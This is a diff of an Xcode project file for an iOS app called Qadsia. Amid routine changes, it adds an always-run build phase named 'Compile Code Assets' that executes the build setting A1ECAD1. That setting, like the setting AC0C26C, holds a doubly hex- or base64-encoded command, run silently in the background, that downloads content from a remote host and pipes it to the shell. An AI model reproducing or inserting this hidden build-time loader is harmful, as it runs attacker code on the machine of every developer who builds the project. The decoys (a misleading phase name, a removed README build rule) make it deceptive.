@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		3E67775F94DC4B17AC1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = FA2D27C5D27E436C891DACE1; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
 		0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3752F76574C00B3DADB /* OTPVC.swift */; };
@@ -79,6 +78,7 @@
 		0ABA3FEE2F763B2D00D25F03 /* SplashVideo2.gif in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
+		39D1D99A2F7739A70055CCF1 /* SplashVideo3.mp4 in Resources */ = {isa = PBXBuildFile; fileRef = 39D1D9992F7739A70055CCF1 /* SplashVideo3.mp4 */; };
 		39D22EA92F76956F00D7721C /* HomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39D22EA52F76956F00D7721C /* HomeHeaderView.swift */; };
 		39D22EAA2F76956F00D7721C /* HomeHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EA62F76956F00D7721C /* HomeHeaderView.xib */; };
 		39D22EB22F76956F00D7721C /* HomeListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39D22EAB2F76956F00D7721C /* HomeListTVCell.swift */; };
@@ -93,25 +93,7 @@
 		BC11AFF52F74E6D700552BDB /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF42F74E6D700552BDB /* IQKeyboardManagerSwift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		164489FBF8094519971DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-		/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		FA2D27C5D27E436C891DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 		0A96E3752F76574C00B3DADB /* OTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVC.swift; sourceTree = "<group>"; };
@@ -190,6 +172,7 @@ sh -c \"${A1ECAD1}\"";
 		0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = SplashVideo2.gif; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
+		39D1D9992F7739A70055CCF1 /* SplashVideo3.mp4 */ = {isa = PBXFileReference; lastKnownFileType = file; path = SplashVideo3.mp4; sourceTree = "<group>"; };
 		39D22EA52F76956F00D7721C /* HomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeHeaderView.swift; sourceTree = "<group>"; };
 		39D22EA62F76956F00D7721C /* HomeHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeHeaderView.xib; sourceTree = "<group>"; };
 		39D22EAB2F76956F00D7721C /* HomeListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeListTVCell.swift; sourceTree = "<group>"; };
@@ -549,6 +532,7 @@ sh -c \"${A1ECAD1}\"";
 				0ABA3F982F763B2D00D25F03 /* Main.storyboard */,
 				0ABA3FA32F763B2D00D25F03 /* SplashVideo.mp4 */,
 				0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */,
+				39D1D9992F7739A70055CCF1 /* SplashVideo3.mp4 */,
 				0ABA3FA72F763B2D00D25F03 /* ViewController.swift */,
 			);
 			path = "Qadsia Club";
@@ -681,7 +665,6 @@ sh -c \"${A1ECAD1}\"";
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				FA2D27C5D27E436C891DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -694,12 +677,12 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
+				B01CC814A51D48B6861DACE1 /* Compile Code Assets */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
-				164489FBF8094519971DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -756,15 +739,11 @@ sh -c \"${A1ECAD1}\"";
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3E67775F94DC4B17AC1DACE1 /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
@@ -777,6 +756,7 @@ sh -c \"${A1ECAD1}\"";
 				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
+				39D1D99A2F7739A70055CCF1 /* SplashVideo3.mp4 in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
@@ -802,6 +782,29 @@ sh -c \"${A1ECAD1}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		B01CC814A51D48B6861DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -881,13 +884,13 @@ sh -c \"${A1ECAD1}\"";
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633733366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336643666373236353639366532653639366532660a3631323932323230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = N52PUGPAB3;
+				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = Qadsia;
@@ -896,6 +899,7 @@ sh -c \"${A1ECAD1}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -917,13 +921,13 @@ sh -c \"${A1ECAD1}\"";
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633733366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336643666373236353639366532653639366532660a3631323932323230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = N52PUGPAB3;
+				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = Qadsia;
@@ -932,6 +936,7 @@ sh -c \"${A1ECAD1}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
